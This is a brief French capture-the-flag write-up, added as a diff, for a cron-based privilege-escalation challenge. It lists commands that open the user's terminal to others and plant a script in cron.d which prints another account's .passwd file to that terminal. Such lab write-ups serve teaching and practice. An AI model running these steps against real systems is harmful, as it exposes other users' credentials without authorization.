@@ -1,0 +1,11 @@
+Il est indiqué dans les commentaires du script que, selon une règle crontab, il est exécuté toutes les minutes par l’utilisateur app-script-ch4-cracked.
+Ce script va, entre autres, exécuter les commandes avec les droits d’app-script-ch4-cracked indiquées dans le dossier cron.d/
+Comme on est des gros fainéants et qu’on n’a pas envie de se déplacer dans /tmp, on va demander à app-script-ch4-cracked de nous afficher le contenu de .passwd directement sur notre terminal ;-) :
+
+    On commence par déterminer le numéro de notre terminal : set | grep /dev/pts -> supposons que notre terminal soit /dev/pts/n ;
+    On autorise le groupe "others" à écrire dessus : chmod o+w /dev/pts/n ;
+    On écrit notre petit script dans cron.d : vim cron.d/script.sh :
+    #!/bin/bash
+    /bin/cat /challenge/app-script/ch4/.passwd > /dev/pts/n
+    On donne le droit d’exécution et de lecture (le "$task du script ch4 imposant la lecture du contenu du script) au groupe "others" -> chmod o+rx cron.d/script.sh ;
+    On attend un petit peu, et le flag apparaît sur notre terminal :-)) .
